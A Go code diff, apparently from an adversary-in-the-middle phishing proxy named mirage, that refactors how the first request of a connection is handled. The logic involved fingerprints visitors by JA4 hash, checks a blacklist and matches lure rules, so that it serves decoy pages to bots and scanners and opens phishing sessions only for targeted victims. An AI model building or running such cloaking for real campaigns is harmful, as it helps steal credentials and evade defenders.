@@ -15,11 +15,15 @@ import (
 	"github.com/travisbale/mirage/internal/aitm"
 )
 
-// Sentinel errors returned by handleInit to signal how HandleRequest should respond.
-var (
-	errSpoof     = errors.New("spoof")
-	errSpoofLure = errors.New("spoof with lure target")
-	errBlock     = errors.New("block")
+// initResult signals how handleRequest should respond after initSession.
+type initResult int
+
+const (
+	initFailed    initResult = iota // error occurred; check the error return
+	initOK                          // session created or loaded; continue pipeline
+	initSpoof                       // serve spoof page (bot, blacklist, unknown host)
+	initSpoofLure                   // serve spoof page with lure target URL
+	initBlock                       // return 404
 )
 
 // serve is the HTTP/1.1 keep-alive loop. It reads requests off the
@@ -91,19 +95,24 @@ func (c *connection) handleRequest(r *http.Request) {
 
 	// 0. Connection setup on first request.
 	if c.session == nil {
-		if err := c.initSession(r); err != nil {
-			switch {
-			case errors.Is(err, errSpoof):
-				c.server.Spoofer.Spoof(w, r)
-			case errors.Is(err, errSpoofLure):
-				c.server.Spoofer.SpoofTarget(w, r, c.spoofURL())
-			case errors.Is(err, errBlock):
-				http.Error(w, "Not Found", http.StatusNotFound)
-			default:
-				c.server.Logger.Error("connection setup failed", "error", err)
-				c.server.Spoofer.Spoof(w, r)
-			}
-
+		result, err := c.initSession(r)
+		if err != nil {
+			c.server.Logger.Error("connection setup failed", "error", err)
+			c.server.Spoofer.Spoof(w, r)
+			w.flush()
+			return
+		}
+		switch result {
+		case initSpoof:
+			c.server.Spoofer.Spoof(w, r)
+			w.flush()
+			return
+		case initSpoofLure:
+			c.server.Spoofer.SpoofTarget(w, r, c.spoofURL())
+			w.flush()
+			return
+		case initBlock:
+			http.Error(w, "Not Found", http.StatusNotFound)
 			w.flush()
 			return
 		}
@@ -179,9 +188,9 @@ func (c *connection) handleRequest(r *http.Request) {
 
 // initSession performs connection-level setup using the first HTTP request: IP
 // extraction, bot detection, blacklist check, phishlet/lure resolution, and
-// session creation. Returns a sentinel error (errSpoof, errSpoofLure, errBlock)
-// to signal the response type, or a wrapped error for unexpected failures.
-func (c *connection) initSession(firstReq *http.Request) error {
+// session creation. Returns an initResult indicating how the caller should
+// respond, or an error for unexpected failures.
+func (c *connection) initSession(firstReq *http.Request) (initResult, error) {
 	// 1. Extract client IP.
 	c.clientIP = extractClientIP(firstReq, c.server.TrustedCIDRs)
 
@@ -189,28 +198,28 @@ func (c *connection) initSession(firstReq *http.Request) error {
 	if c.ja4Hash != "" {
 		c.botVerdict = c.server.BotGuard.Evaluate(c.ja4Hash, nil)
 		if c.botVerdict == aitm.VerdictSpoof {
-			return errSpoof
+			return initSpoof, nil
 		}
 
 		if c.botVerdict == aitm.VerdictBlock {
-			return errBlock
+			return initBlock, nil
 		}
 	}
 
 	// 3. Blacklist check.
 	if c.server.Blacklist.IsBlocked(c.clientIP) {
-		return errSpoof
+		return initSpoof, nil
 	}
 
 	// 4. Resolve phishlet + lure from hostname.
 	hostname := hostWithoutPort(strings.ToLower(firstReq.Host))
 	phishlet, lure, err := c.server.PhishletSvc.ResolveHostname(hostname, firstReq.URL.Path)
 	if err != nil {
-		return fmt.Errorf("resolving hostname %q: %w", hostname, err)
+		return initFailed, fmt.Errorf("resolving hostname %q: %w", hostname, err)
 	}
 
 	if phishlet == nil {
-		return errSpoof
+		return initSpoof, nil
 	}
 
 	c.phishlet = phishlet
@@ -227,12 +236,12 @@ func (c *connection) initSession(firstReq *http.Request) error {
 	if c.session == nil {
 		// New visitor — enforce lure rules before creating a session.
 		if lure == nil || lure.IsPaused() || !lure.MatchesUA(firstReq.UserAgent()) {
-			return errSpoofLure
+			return initSpoofLure, nil
 		}
 
 		sess, err := c.server.SessionSvc.NewSession(c.clientIP, c.ja4Hash, lure.ID, phishlet.Name)
 		if err != nil {
-			return fmt.Errorf("creating session: %w", err)
+			return initFailed, fmt.Errorf("creating session: %w", err)
 		}
 		c.session = sess
 		c.isNewSession = true
@@ -251,7 +260,7 @@ func (c *connection) initSession(firstReq *http.Request) error {
 		c.puppetOverride = c.server.PuppetSvc.GetOverride(phishlet.Name)
 	}
 
-	return nil
+	return initOK, nil
 }
 
 // matchIntercept returns the first matching intercept rule, or nil.
